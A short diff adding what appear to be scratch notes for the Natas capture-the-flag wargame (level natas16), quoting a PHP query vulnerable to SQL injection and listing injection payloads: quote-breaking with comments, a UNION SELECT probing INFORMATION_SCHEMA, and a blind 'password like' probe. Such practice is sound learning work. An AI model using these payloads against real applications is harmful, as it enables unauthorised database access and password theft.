@@ -1,0 +1,11 @@
+"SELECT * from users where username=\"".$_REQUEST["username"]."\"";
+
+"natas16";"Select * from users"
+
+"natas16""SELECT * from users"\"";--
+
+"natas16" UNION ALL SELECT 1,2 from INFORMATION_SCHEMA.tables WHERE 
+substring(table_name,1,1) = "a" ;#;
+
+
+natas16" AND password like "asdf
